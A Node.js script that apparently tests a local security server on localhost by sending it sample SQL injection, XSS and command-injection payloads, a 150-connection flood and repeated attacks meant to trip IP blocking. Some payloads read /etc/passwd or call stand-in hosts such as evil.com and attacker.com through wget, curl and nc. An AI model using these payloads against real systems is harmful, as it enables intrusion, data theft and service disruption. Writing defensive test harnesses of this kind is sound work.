const net = require('net');

// Function to create a connection and send data
async function simulateAttack(payload, type) {
    return new Promise((resolve, reject) => {
        const client = new net.Socket();
        
        client.connect(3002, 'localhost', () => {
            console.log(`\n[${new Date().toISOString()}] Initiating ${type} attack...`);
            client.write(JSON.stringify({ type, payload }) + '\n');
        });

        client.on('data', (data) => {
            console.log(`[Server Response] ${data}`);
        });

        client.on('end', () => {
            console.log(`[Connection] Server ended connection for ${type} attack`);
            client.destroy();
            resolve();
        });

        client.on('error', (err) => {
            if (err.code === 'ECONNREFUSED') {
                console.log(`[Blocked] Attack prevented: ${type} - Connection refused`);
            } else {
                console.log(`[Error] Failed ${type} attack: ${err.message}`);
            }
            client.destroy();
            resolve();
        });

        // Ensure connection is closed after timeout
        setTimeout(() => {
            if (!client.destroyed) {
                client.destroy();
                resolve();
            }
        }, 2000);
    });
}

// Function to simulate SQL Injection
async function simulateSQLInjection() {
    const payloads = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM passwords; --",
        "admin' --"
    ];
    
    for (const payload of payloads) {
        await simulateAttack(payload, 'SQL Injection');
        await new Promise(resolve => setTimeout(resolve, 500));
    }
}

// Function to simulate XSS
async function simulateXSS() {
    const payloads = [
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        "<img src='x' onerror='alert(1)'>",
        "<svg onload='alert(1)'>"
    ];
    
    for (const payload of payloads) {
        await simulateAttack(payload, 'XSS');
        await new Promise(resolve => setTimeout(resolve, 500));
    }
}

// Function to simulate Command Injection
async function simulateCommandInjection() {
    const payloads = [
        "; cat /etc/passwd",
        "| wget malicious.com/script",
        "`curl evil.com`",
        "$(nc attacker.com 4444)"
    ];
    
    for (const payload of payloads) {
        await simulateAttack(payload, 'Command Injection');
        await new Promise(resolve => setTimeout(resolve, 500));
    }
}

// Function to simulate DDoS
async function simulateDDoS() {
    console.log('\n[DDoS] Starting DDoS attack simulation...');
    const connections = [];
    
    for (let i = 0; i < 150; i++) {
        connections.push(simulateAttack(`DDoS-Packet-${i}`, 'DDoS'));
        // Sending packets rapidly
        await new Promise(resolve => setTimeout(resolve, 10));
    }
    
    await Promise.all(connections);
    console.log('[DDoS] DDoS attack simulation completed');
}

// Function to demonstrate repeated attacks
async function demonstrateIPBlocking() {
    console.log('\n[IP Blocking] Testing IP blocking mechanism...');
    
    // Simulate multiple attacks from same IP
    for (let i = 0; i < 5; i++) {
        await simulateAttack("' OR '1'='1", 'SQL Injection');
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
}

// Main demonstration function
async function runDemonstration() {
    try {
        // Start with SQL Injection attacks
        console.log('\n=== Starting SQL Injection Simulation ===');
        await simulateSQLInjection();
        
        // XSS attacks
        console.log('\n=== Starting XSS Attack Simulation ===');
        await simulateXSS();
        
        // Command Injection attacks
        console.log('\n=== Starting Command Injection Simulation ===');
        await simulateCommandInjection();
        
        // DDoS attack
        console.log('\n=== Starting DDoS Attack Simulation ===');
        await simulateDDoS();
        
        // IP Blocking demonstration
        console.log('\n=== Testing IP Blocking ===');
        await demonstrateIPBlocking();
        
        console.log('\n=== Security Test Complete ===');
        
    } catch (error) {
        console.error('Error during demonstration:', error);
    }
}

// Run the demonstration
console.log('Starting security test...');
setInterval(runDemonstration, 30000); // Run every 30 seconds
runDemonstration(); // Run immediately first time